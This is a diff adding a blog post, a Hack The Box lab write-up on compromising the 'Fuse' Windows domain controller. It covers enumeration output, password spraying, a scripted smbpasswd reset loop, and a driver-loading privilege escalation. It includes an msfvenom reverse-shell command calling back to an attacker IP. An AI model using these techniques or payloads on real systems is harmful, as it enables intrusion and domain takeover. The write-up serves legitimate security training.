@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Windows - Medium] - Fuse | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Windows - Medium] - Fuse" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2022/08/19/Fuse.html" />
+<meta property="og:url" content="http://localhost:4000/2022/08/19/Fuse.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-19T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Windows - Medium] - Fuse" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-19T00:00:00+02:00","datePublished":"2022-08-19T00:00:00+02:00","headline":"HTB Writeup [Windows - Medium] - Fuse","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/08/19/Fuse.html"},"url":"http://localhost:4000/2022/08/19/Fuse.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Windows - Medium] - Fuse</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-08-19T00:00:00+02:00" itemprop="datePublished">Aug 19, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Fuse/Fuse.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li>Fuse is a <strong>Windows Domain Controller</strong> machine with <strong>IIS</strong> listening on port 80.</li>
+  <li><em>When checking the website,</em> we get <strong>redirected</strong> to a certain <strong>web page titled “PaperCut Print Logger”.</strong></li>
+  <li><em>On that page,</em> we find the <strong>printing activity of some domain users</strong>. That gets us an initial <strong>list of usernames, workstations and document names.</strong></li>
+  <li><strong>One of the documents’ name stuck out:</strong> <code class="language-plaintext highlighter-rouge">"Fabricorp01.docx"</code> which <strong><em>looked like a possible password/password scheme to try.</em></strong></li>
+  <li><em>After spraying that password and others with the same pattern,</em> We find that <strong>it was indeed used by 3 of the users</strong>. But was <strong>expired and had to be changed.</strong></li>
+  <li><em>Using the linux</em> <code class="language-plaintext highlighter-rouge">smbpassswd</code> <em>utility</em>, we were able to <strong>change passwords and gain access</strong>. But <strong>neither of the users had WinRM capability or valuable findings in their SMB shares</strong>.</li>
+  <li><em>However, after doing a</em> <code class="language-plaintext highlighter-rouge">Bloodhound</code> <em>collection and inspecting the output</em>, we notice that <strong>there’s a potential path to Domain Administrator if we compromise the</strong> <code class="language-plaintext highlighter-rouge">svc-print</code> <strong>account</strong>. That’s because <strong>it has PowerShell Remoting access and is a member of the Print Operators AD group</strong> which <strong>hold the dangerous</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriver</code> <strong>privilege.</strong></li>
+  <li><em>Following the findings from</em> <code class="language-plaintext highlighter-rouge">Bloodhound</code> <em>and the</em> <strong><em>theme of printing</em></strong> <em>which was recurring throughout the machine</em>, we <strong>enumerate the printers of the domain</strong> to <strong>find a password in a printers’ description field</strong>.</li>
+  <li>We <strong>run another password spray</strong> over all domain users with that password and <strong>get access to the</strong> <code class="language-plaintext highlighter-rouge">svc-print</code> <strong>account</strong>. We use it to <strong>gain a remote PowerShell session on the box.</strong></li>
+  <li>We  then <strong>abuse its</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> to <strong>load a vulnerable driver into the kernel</strong> and <strong>exploit that to get code execution as</strong> <code class="language-plaintext highlighter-rouge">NT Authority\System</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-17 10:34:00Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc        Microsoft Windows RPC
+49680/tcp open  msrpc        Microsoft Windows RPC
+49698/tcp open  msrpc        Microsoft Windows RPC
+49754/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-08-17T10:34:56
+|_  start_date: 2022-08-17T10:14:17
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_clock-skew: mean: 2h32m59s, deviation: 4h02m30s, median: 12m58s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE\x00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System time: 2022-08-17T03:34:53-07:00
+</code></pre></div></div>
+<p>Spotting <strong>DNS, kerberos and LDAP</strong> is a <strong>dead giveaway</strong> of the box being <strong>a Domain Controller.</strong></p>
+
+<p>Nmap’s <strong>version detection</strong> and <strong>default scripts</strong> give us good information:</p>
+<ol>
+  <li>The <strong>host name</strong> is <code class="language-plaintext highlighter-rouge">fuse</code></li>
+  <li>It’s very likely <strong>Windows Server 2016</strong></li>
+  <li>The <strong>domain name</strong> is <code class="language-plaintext highlighter-rouge">fabricorp.local</code></li>
+</ol>
+
+<p>we also know that <strong>WSMan is available on port 5985</strong> which <strong>is good if we get a user with PowerShell Remoting access.</strong></p>
+
+<p>Let’s start enumeration!</p>
+
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+<p>We do the <strong>quick standard checks</strong> for <strong>null, guest and anonymous authentication:</strong></p>
+
+<p><img src="/assets/Fuse/smb-enum.jpg" alt="" /></p>
+
+<p>nothing there besides <strong>confirming OS version</strong> <code class="language-plaintext highlighter-rouge">Windows Server 2016 Standard 14393</code> and <strong>knowing the processor architecture:</strong> <code class="language-plaintext highlighter-rouge">x64</code></p>
+
+<h2 id="rpc-enumeration">RPC Enumeration</h2>
+<p>Our favourite <strong>RPC enumeration tool</strong> <a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a> didn’t yield much more information either.</p>
+
+<p>We <strong>note down the Domain SID</strong> and move along.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng.py <span class="nt">-A</span> fuse
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENUM4LINUX - next generation
+
+ ==========================
+|    Target Information    |
+ ==========================
+[*] Target ........... fuse
+[*] Username ......... ''
+[*] Random Username .. 'ujlfkgys'
+[*] Password ......... ''
+[*] Timeout .......... 5 second(s)
+
+ ============================
+|    Service Scan on fuse    |
+ ============================
+[*] Checking LDAP
+[+] LDAP is accessible on 389/tcp
+[*] Checking LDAPS
+[+] LDAPS is accessible on 636/tcp
+[*] Checking SMB
+[+] SMB is accessible on 445/tcp
+[*] Checking SMB over NetBIOS
+[+] SMB over NetBIOS is accessible on 139/tcp
+
+ ============================================
+|    Domain Information via LDAP for fuse    |
+ ============================================
+[*] Trying LDAP
+[+] Appears to be root/parent DC
+[+] Long domain name is: fabricorp.local
+
+ ============================================
+|    NetBIOS Names and Workgroup for fuse    |
+ ============================================
+[-] Could not get NetBIOS names information via 'nmblookup': timed out
+
+ =================================
+|    SMB Dialect Check on fuse    |
+ =================================
+[*] Trying on 445/tcp
+[+] Supported dialects and settings:
+SMB 1.0: true
+SMB 2.02: true
+SMB 2.1: true
+SMB 3.0: true
+SMB1 only: false
+Preferred dialect: SMB 3.0
+SMB signing required: true
+
+ =================================
+|    RPC Session Check on fuse    |
+ =================================
+[*] Check for null session
+[+] Server allows session using username '', password ''
+[*] Check for random user session
+[-] Could not establish random user session: STATUS_LOGON_FAILURE
+
+ ===========================================
+|    Domain Information via RPC for fuse    |
+ ===========================================
+[+] Domain: FABRICORP
+[+] SID: S-1-5-21-2633719317-1471316042-3957863514
+[+] Host is part of a domain (not a workgroup)
+
+ ===================================================
+|    Domain Information via SMB session for fuse    |
+ ===================================================
+[*] Enumerating via unauthenticated SMB session on 445/tcp
+[+] Found domain information via SMB
+NetBIOS computer name: FUSE
+NetBIOS domain name: FABRICORP
+DNS domain: fabricorp.local
+FQDN: Fuse.fabricorp.local
+
+ =======================================
+|    OS Information via RPC for fuse    |
+ =======================================
+[*] Enumerating via unauthenticated SMB session on 445/tcp
+[+] Found OS information via SMB
+[*] Enumerating via 'srvinfo'
+[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
+[+] After merging OS information we have the following result:
+OS: Windows Server 2016 Standard 14393
+OS version: '10.0'
+OS release: '1607'
+OS build: '14393'
+Native OS: Windows Server 2016 Standard 14393
+Native LAN manager: Windows Server 2016 Standard 6.3
+Platform id: null
+Server type: null
+Server type string: null
+
+ =============================
+|    Users via RPC on fuse    |
+ =============================
+[*] Enumerating users via 'querydispinfo'
+[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
+[*] Enumerating users via 'enumdomusers'
+[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
+
+ ==============================
+|    Groups via RPC on fuse    |
+ ==============================
+[*] Enumerating local groups
+[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
+[*] Enumerating builtin groups
+[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
+[*] Enumerating domain groups
+[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED
+
+ ==============================
+|    Shares via RPC on fuse    |
+ ==============================
+[*] Enumerating shares
+[+] Found 0 share(s) for user '' with password '', try a different user
+
+ =================================
+|    Policies via RPC for fuse    |
+ =================================
+[*] Trying port 445/tcp
+[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
+[*] Trying port 139/tcp
+[-] SMB connection error on port 139/tcp: STATUS_ACCESS_DENIED
+
+ =================================
+|    Printers via RPC for fuse    |
+ =================================
+[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED
+
+Completed after 24.97 seconds
+</code></pre></div></div>
+
+<h2 id="ldap-enumeration">LDAP Enumeration</h2>
+<p>The same went for <strong>LDAP</strong>: <strong>anonymous bind</strong> isn’t enabled :/</p>
+
+<p><img src="/assets/Fuse/no-ldap-anon.jpg" alt="" /></p>
+
+<h2 id="the-website">The Website</h2>
+<p><em>Having cleared away all the quick and simple checks,</em> it’s time to take a look at port 80.</p>
+
+<p><img src="/assets/Fuse/website-homepage.jpg" alt="" /></p>
+
+<p><em>Right off the bat,</em> we get <strong>redirected</strong> to <code class="language-plaintext highlighter-rouge">/papercut/logs/html/index.htm</code>.</p>
+
+<p>we <strong>read the decription</strong> to know that <strong>live print logs are listed in the table below</strong> for us to check.</p>
+
+<p><em>Checking the first one,</em> we see <strong>usernames</strong> as well as <strong>document</strong> and <strong>computer</strong> names.</p>
+
+<p><img src="/assets/Fuse/print-log-page-1.jpg" alt="" /></p>
+
+<p>We do the same for the 2nd and 3rd log pages.</p>
+
+<p><img src="/assets/Fuse/print-log-page-2.jpg" alt="" /></p>
+
+<p><img src="/assets/Fuse/print-log-page-3.jpg" alt="" /></p>
+
+<p>Our <strong>notes</strong>:</p>
+<ul>
+  <li><strong>Usernames:</strong> pmerton, tlavel, bnielson, sthompson, bhult and administrator</li>
+  <li><strong>Workstations:</strong> JUMP01, LONWK015, LONWK019, LAPTOP07 and of course FUSE</li>
+</ul>
+
+<p>And <strong>Document names</strong>:</p>
+<ul>
+  <li>New Starter - bnielson</li>
+  <li>IT Budget Meeting Minutes</li>
+  <li>backup_tapes</li>
+  <li>mega_mountain_tape_request</li>
+  <li><strong>Fabricorp01</strong></li>
+  <li>offsite_dr_invocation</li>
+  <li>printing_issue_test</li>
+</ul>
+
+<p>All document names <em>seem pretty normal</em>. Except for that <code class="language-plaintext highlighter-rouge">Fabricorp01</code> :D</p>
+
+<p>A gut feeling is telling us: “That’s a password!” XD</p>
+
+<p><em>And if it wasn’t,</em> it wouldn’t hurt to try <code class="language-plaintext highlighter-rouge">Fabricorp02</code>, <code class="language-plaintext highlighter-rouge">Fabricorp03</code> and so on…</p>
+
+<h2 id="why-not-spray">Why not spray?</h2>
+<p><em>Before delving into any password attacks,</em> we’re better off <strong>verifying the usernames we got</strong>. We’re going to use <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for that:</p>
+
+<p><img src="/assets/Fuse/kerbrute-userenum.jpg" alt="" /></p>
+
+<p><strong>Awesome! every single one of them was valid!</strong></p>
+
+<p><em>Having a list of valid usernames and another with potential passwords,</em> we get to spraying..</p>
+
+<p><img src="/assets/Fuse/likely-pass-list.jpg" alt="" /></p>
+
+<p><img src="/assets/Fuse/password-spray-1.jpg" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">tlavel</code>, <code class="language-plaintext highlighter-rouge">bnielson</code> and <code class="language-plaintext highlighter-rouge">bhult</code> seem to have that password <code class="language-plaintext highlighter-rouge">Fabricorp01</code>. But it’s <strong><em>expired</em></strong>.</p>
+
+<p>We need to find a way to reset it.</p>
+
+<p><strong><em>RDP would’ve been nice here</em></strong>. But port 3389 isn’t open :/</p>
+
+<p><em>After failing to reset the password dusing RPC’s</em> <code class="language-plaintext highlighter-rouge">setuserinfo2</code> <em>command</em>, we <strong>do some further research</strong> and <strong>come across a handy tool</strong> called <code class="language-plaintext highlighter-rouge">smbpasswd</code>.</p>
+
+<p>It was <strong>built for administering Samba</strong> but <strong>Let’s take a look at its documentation:</strong></p>
+
+<p><img src="/assets/Fuse/smbpasswd-docs.jpg" alt="" /></p>
+
+<p><strong>Jackpot! This is exactly what we need</strong>. let’s see if it can do the job.</p>
+
+<p><img src="/assets/Fuse/smbpasswd-change-pass.jpg" alt="" /></p>
+
+<p>Awesome. We now <strong>have more room for enumeration</strong>.</p>
+
+<h2 id="authenticated-information-gathering">Authenticated Information Gathering</h2>
+<p><strong>Our access is now expanded with 3 users</strong>. We can try:</p>
+<ol>
+  <li><strong>Pulling the rest of the domain users</strong> and <strong>going for another</strong> <code class="language-plaintext highlighter-rouge">Fabricorp0X</code> <strong>spray</strong>.</li>
+  <li><strong>Enumerating all the SMB share access</strong> to check what’s there.</li>
+  <li><strong>Checking for WinRM access.</strong></li>
+  <li>Doing a <strong>Bloodhound collection</strong> to see what’s <strong>Kerberoastable</strong>, what’s <strong>ASREPRoastable</strong>, <strong>who has access to what</strong> etc.</li>
+</ol>
+
+<p>And more.</p>
+
+<p><em>However,</em> there’s an obstacle.</p>
+
+<p><img src="/assets/Fuse/auto-reset-password-status.jpg" alt="" /></p>
+
+<p><em>As explained in the image above,</em> something happens after we reset one user’s password. it changes back to what it was.</p>
+
+<p>There’s <strong>automation</strong> going on. One that <strong>resets the password to the initial</strong> <code class="language-plaintext highlighter-rouge">Fabricorp01</code> <em>around every minute</em> and <strong>requires it to be changed.</strong></p>
+
+<p><strong>To handle this and make our lives easier,</strong> we’ll have to <strong>come up with automation of our own</strong>. Let’s look up the help for the <code class="language-plaintext highlighter-rouge">smbpasswd</code> utility to see <strong>what options it offers:</strong></p>
+
+<p><img src="/assets/Fuse/smbpasswd-help.jpg" alt="" /></p>
+
+<p><em>Turns out that, with the help of the</em> <code class="language-plaintext highlighter-rouge">-s</code> <em>flag</em>, we can <strong>pass in passwords through</strong> <code class="language-plaintext highlighter-rouge">stdin</code>.</p>
+
+<p>the old password + the new one + the confirmation would be fed to <code class="language-plaintext highlighter-rouge">smbpasswd</code> with a new line in between.</p>
+
+<p><em>minding that</em> <strong>a new password must be given every time we do a reset</strong>. Because <strong>Active Directory</strong> <em>-by default-</em> <strong>remembers the last 24 passwords you used on a given account.</strong> A feature called <strong>“Password History”</strong>.</p>
+
+<p>So it’s better to <strong>have the password as a command line argument</strong> for our script.</p>
+
+<p>Here’s what it looks like:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="k">for </span>user <span class="k">in</span> <span class="o">{</span><span class="s1">'tlavel'</span>,<span class="s1">'bnielson'</span>,<span class="s1">'bhult'</span><span class="o">}</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Fabricorp01</span><span class="se">\n</span><span class="nv">$1</span><span class="se">\n</span><span class="nv">$1</span><span class="s2">"</span> | smbpasswd <span class="nt">-r</span> fuse <span class="nt">-U</span> <span class="nv">$user</span> <span class="nt">-s</span>
+        <span class="c"># any command we want to run with the new password before it gets reset</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>we’re targetting all the users there. Let’s <strong>check their SMB share access</strong> and <strong>if they can use WinRM</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cme winrm fuse <span class="nt">-u</span> <span class="nv">$user</span> <span class="nt">-p</span> <span class="nv">$1</span>
+cme smb fuse <span class="nt">-u</span> <span class="nv">$user</span> <span class="nt">-p</span> <span class="nv">$1</span> <span class="nt">--shares</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Fuse/automated-pass-reset.jpg" alt="" /></p>
+
+<p>The script ran well. <em>However,</em> <strong>none of the users had WinRM access</strong> and <strong>we didn’t find anything valuable in the SMB shares</strong> when we checked.</p>
+
+<p><em>To prepare for a</em> <strong><em>full domain password spray,</em></strong> We <strong>modify the script</strong> to <strong>target only one user</strong> and <strong>pull all the domain users</strong> using <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
+
+<p><img src="/assets/Fuse/getting-all-ad-users.jpg" alt="" /></p>
+
+<p>We target all the remaining users with <code class="language-plaintext highlighter-rouge">Fabricorp01</code> through <code class="language-plaintext highlighter-rouge">Fabricorp09</code> but with no success :/</p>
+
+<p><img src="/assets/Fuse/2nd-password-spray.jpg" alt="" /></p>
+
+<h2 id="ad-enumeration-with-bloodhound">AD Enumeration with Bloodhound</h2>
+<p>We do a <code class="language-plaintext highlighter-rouge">BloodHound</code> collection from our Kali using <a href="https://github.com/fox-it/BloodHound.py">Bloodhound.py</a>. But don’t find anything exploitable with any of our owned users.</p>
+
+<p><em>However, since the number of the users in the domain is relatively small,</em> we <strong>inspected everyone up close.</strong></p>
+
+<p>Until we found <code class="language-plaintext highlighter-rouge">svc-print</code>…</p>
+
+<p><img src="/assets/Fuse/svc-print-privs.jpg" alt="" /></p>
+
+<p>This account <strong>is our target</strong> to <strong>take over the domain.</strong></p>
+
+<p>Because it can:</p>
+<ol>
+  <li><strong>Gain a remote shell onto the Domain Controller</strong> (since <strong>it’s part of the “Remote Management Users”</strong> group)</li>
+  <li><strong>Perform privilege escalation</strong> by <strong>abusing the</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> (a privilege <strong>held by all members of the “Print Operators” group</strong>) to <strong>load malicious drivers into the kernel.</strong></li>
+</ol>
+
+<p><em>Right now,</em> <strong>all of our attention is directed towards obtaining access to this account.</strong></p>
+
+<h2 id="printer-enumeration">Printer Enumeration</h2>
+<p><em>Since printers have been mentioned way too many times in this machine</em> (the <strong>website</strong>, <strong>SMB shares</strong> and in <strong>BloodHound</strong>), we have to <strong>do decent enumeration</strong> on them.</p>
+
+<p>We can do that <strong>via RPC</strong> with a valid account.</p>
+
+<p>Let’s <strong>re-run</strong> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> <strong>with credentials this time</strong> and see what comes up.</p>
+
+<p><img src="/assets/Fuse/rpc-printer-enumeration.jpg" alt="" /></p>
+
+<p>A <strong>password was there in the description</strong> :D</p>
+
+<p>we should’ve redone this part after obtaining those users. Oh well :/</p>
+
+<p><em>Naturally,</em> we <strong>spray that password</strong>. To find both <code class="language-plaintext highlighter-rouge">svc-print</code> and <code class="language-plaintext highlighter-rouge">svc-scan</code> using it.</p>
+
+<p>We used <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to get on the box and <strong>ignored</strong> <code class="language-plaintext highlighter-rouge">svc-scan</code> <em>since it doesn’t hold any special privileges..</em></p>
+
+<p><img src="/assets/Fuse/print-pass-worked.jpg" alt="" /></p>
+
+<p><em>With this access,</em> it’s time for some <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> abuse.</p>
+
+<p><img src="/assets/Fuse/se-load-driver-priv.jpg" alt="" /></p>
+
+<h2 id="evil-driver-pwnage">Evil Driver Pwnage</h2>
+<p>The amazing <a href="https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">article</a> by <strong>Tarlogic Cybersecurity</strong> explains the <strong>theory</strong> and details <strong>the steps of exploitation</strong>. Give it a read for the full picture.</p>
+
+<p><em>But, in short,</em> what we’re going to do is:</p>
+<ul>
+  <li><strong>Download a vulnerable driver</strong> (<code class="language-plaintext highlighter-rouge">Capcom.sys</code>) <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">here</a>. <em>-And, yes, it’s the game company :D-</em> <strong>we’re deliberately using it because it can be exploited for Privesc</strong>.</li>
+  <li><strong>Load it into the kernel</strong> with our held privilege using <strong>Tarlogic’s</strong> <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver</a> tool</li>
+  <li><strong>Exploit the driver</strong> using the public exploit from <strong>Tandasat</strong> <a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a> <em>(after making a few modifications to its code)</em>.</li>
+</ul>
+
+<p><em>After downloading</em> <code class="language-plaintext highlighter-rouge">Capcom.sys</code>, we compile the <code class="language-plaintext highlighter-rouge">EoPLoadDriver.exe</code> using <strong>Visual Studio</strong></p>
+
+<p>Then <strong>modify</strong> the <code class="language-plaintext highlighter-rouge">ExploitCapcom</code> code before compiling it to <strong>run a reverse shell executable</strong> <code class="language-plaintext highlighter-rouge">rev.exe</code> <em>(instead of launching cmd.exe)</em></p>
+
+<p><img src="/assets/Fuse/modifying-exploit-capcom.jpg" alt="" /></p>
+
+<p>And <strong>generate the reverse shell</strong> using <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.3 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> exe <span class="o">&gt;</span> rev.exe
+</code></pre></div></div>
+
+<p>We <strong>pack the 4 items into an archive</strong> and <strong>upload it to the victim</strong></p>
+
+<p><img src="/assets/Fuse/uploading-exploit-items.jpg" alt="" /></p>
+
+<p><em>Now locked and loaded,</em> we move <code class="language-plaintext highlighter-rouge">rev.exe</code> back one directory to be in <code class="language-plaintext highlighter-rouge">C:\Users\svc-print\Documents</code> <em>(matching the path specified in the</em> <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> <em>executable)</em></p>
+
+<p>And proceed to <strong>load</strong> <code class="language-plaintext highlighter-rouge">Capcom.sys</code> into the <em>writable</em> <code class="language-plaintext highlighter-rouge">HKCU:\System\CurrentControlSet</code> <strong>registry path</strong> using <code class="language-plaintext highlighter-rouge">EoPLoadDriver.exe</code> and naming it <code class="language-plaintext highlighter-rouge">KillerDriver</code> for dramatic effect XD</p>
+
+<p><em>With the driver now in the kernel,</em> we <strong>exploit it</strong> with <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> which <strong>runs</strong> the <code class="language-plaintext highlighter-rouge">rev.exe</code> to <strong>give us a nice reverse shell :D</strong></p>
+
+<p><img src="/assets/Fuse/killer-driver.jpg" alt="" /></p>
+
+<p><strong><em>I guess we blew up a FUSE :P</em></strong></p>
+
+<p><strong>…</strong></p>
+
+<p><strong>Ahem! It was a good box :D</strong></p>
+
+  </div><a class="u-url" href="/2022/08/19/Fuse.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
